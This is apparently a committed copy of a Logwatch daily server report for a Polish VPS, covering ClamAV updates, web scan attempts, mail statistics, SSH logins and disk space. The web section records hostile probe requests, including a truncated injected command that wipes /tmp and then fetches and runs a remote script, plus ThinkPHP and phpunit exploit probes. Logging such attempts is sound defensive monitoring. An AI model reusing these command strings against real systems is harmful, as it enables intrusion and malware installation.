@@ -1,0 +1,162 @@
+Return-Path: <root@hrankiety.pl>
+Delivered-To: postmaster@hrankiety.pl
+Received: by hrankiety.pl (Postfix, from userid 0)
+	id DF7979F20479; Tue, 18 Feb 2020 04:18:07 +0100 (CET)
+To: postmaster@hrankiety.pl
+From: postmaster@hrankiety.pl
+Subject: Logwatch for 2626.serwervps.pl (Linux)
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="iso-8859-1"
+Message-Id: <20200218031807.DF7979F20479@hrankiety.pl>
+Date: Tue, 18 Feb 2020 04:18:04 +0100 (CET)
+
+
+ ################### Logwatch 7.3.6 (05/19/07) #################### 
+        Processing Initiated: Tue Feb 18 04:18:04 2020
+        Date Range Processed: yesterday
+                              ( 2020-Feb-17 )
+                              Period is day.
+      Detail Level of Output: 0
+              Type of Output: unformatted
+           Logfiles for Host: 2626.serwervps.pl
+  ################################################################## 
+ 
+ --------------------- clam-update Begin ------------------------ 
+
+ Last ClamAV update process started at Mon Feb 17 03:35:10 2020
+ 
+ Last Status:
+    WARNING: Your ClamAV installation is OUTDATED!
+    WARNING: Local version: 0.100.3 Recommended version: 0.102.2
+    DON'T PANIC! Read https://www.clamav.net/documents/upgrading-clamav
+    main.cld is up to date (version: 59, sigs: 4564902, f-level: 60, builder: sigmgr)
+    Downloading daily-25725.cdiff [100%]
+    daily.cld updated (version: 25725, sigs: 2188098, f-level: 63, builder: raynman)
+    Can't query daily.25725.93.1.0.6810DA54.ping.clamav.net
+    bytecode.cld is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)
+    Database updated (6753094 signatures) from db.local.clamav.net (IP: 104.16.218.84)
+ 
+ ---------------------- clam-update End ------------------------- 
+
+ 
+ --------------------- httpd Begin ------------------------ 
+
+ 
+ A total of 1 sites probed the server 
+    141.98.11.8
+ 
+ Requests with error response codes
+    400 Bad Request
+       /: 9 Time(s)
+       null: 1 Time(s)
+    404 Not Found
+       //admin/config.php: 1 Time(s)
+       //admin/images/: 1 Time(s)
+       //asterisk/admin/config.php: 1 Time(s)
+       //asterisk/admin/images/: 1 Time(s)
+       //asterisk/recordings/index.php: 2 Time(s)
+       //config.php: 2 Time(s)
+       //fpbx/admin/config.php: 1 Time(s)
+       //fpbx/admin/images/: 1 Time(s)
+       //fpbx/recordings/index.php: 2 Time(s)
+       //freepbx/admin/images/: 1 Time(s)
+       //freepbx/recordings/index.php: 1 Time(s)
+       //html/admin/config.php: 2 Time(s)
+       //html/recordings/index.php: 2 Time(s)
+       //myasterisk/admin/config.php: 1 Time(s)
+       //myasterisk/admin/images/: 1 Time(s)
+       //myasterisk/recordings/index.php: 2 Time(s)
+       //pbx/admin/config.php: 1 Time(s)
+       //pbx/admin/images/: 1 Time(s)
+       //pbx/recordings/index.php: 2 Time(s)
+       //recordings/index.php: 2 Time(s)
+       //www/admin/config.php: 1 Time(s)
+       //www/admin/images/: 1 Time(s)
+       //www/recordings/index.php: 2 Time(s)
+       /Adminb20474bc/Login.php: 1 Time(s)
+       /MyAdmin/scripts/setup.php: 2 Time(s)
+       /PHPMYADMIN/scripts/setup.php: 1 Time(s)
+       /SQL/scripts/setup.php: 1 Time(s)
+       /index.php?s=/Index/\\think\\app/invokefun ... ]=HelloThinkPHP: 1 Time(s)
+       /kontakt.html: 1 Time(s)
+       /manager/text/list: 1 Time(s)
+       /myadmin/scripts/setup.php: 2 Time(s)
+       /mysqladmin/scripts/setup.php: 1 Time(s)
+       /phpMyAdmin/scripts/setup.php: 2 Time(s)
+       /phpmyadmin/scripts/setup.php: 2 Time(s)
+       /pma/scripts/setup.php: 2 Time(s)
+       /shell?cd+/tmp;rm+-rf+*;wget+http://jhasdj ... ws;sh+/tmp/jaws: 1 Time(s)
+       /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php: 1 Time(s)
+       /w00tw00t.at.blackhats.romanian.anti-sec:): 2 Time(s)
+       /wp-login.php: 1 Time(s)
+ 
+ ---------------------- httpd End ------------------------- 
+
+ 
+ --------------------- Postfix Begin ------------------------ 
+
+      200   *Warning: Pre-queue content-filter connection overload 
+     3374   SASL authentication failed 
+     4147   Miscellaneous warnings 
+ 
+    2.707M  Bytes accepted                         2,838,907
+    2.701M  Bytes delivered                        2,832,712
+ ========   ================================================
+ 
+       56   Accepted                                  33.33%
+      112   Rejected                                  66.67%
+ --------   ------------------------------------------------
+      168   Total                                    100.00%
+ ========   ================================================
+ 
+      112   Reject unknown user                      100.00%
+ --------   ------------------------------------------------
+      112   Total Rejects                            100.00%
+ ========   ================================================
+ 
+     7298   Connections made      
+       12   Connections lost      
+     7298   Disconnections        
+       56   Removed from queue    
+       51   Delivered             
+        3   Sent via SMTP         
+        2   Bounce (remote)       
+        1   DSNs undeliverable    
+ 
+        1   Numeric hostname      
+        5   Excessive errors in SMTP commands dialog 
+        3   SASL authenticated messages 
+ 
+ 
+ 
+ ---------------------- Postfix End ------------------------- 
+
+ 
+ --------------------- SSHD Begin ------------------------ 
+
+ 
+ Users logging in through sshd:
+    btertil:
+       185.17.41.230 (backup): 2 times
+ 
+ 
+ Received disconnect:
+    11: disconnected by user : 2 Time(s)
+ 
+ ---------------------- SSHD End ------------------------- 
+
+ 
+ --------------------- Disk Space Begin ------------------------ 
+
+ Filesystem      Size  Used Avail Use% Mounted on
+ /dev/simfs       50G   24G   27G  48% /
+ none            1.0G  4.0K  1.0G   1% /dev
+ 
+ 
+ ---------------------- Disk Space End ------------------------- 
+
+ 
+ ###################### Logwatch End ######################### 
+
+ 
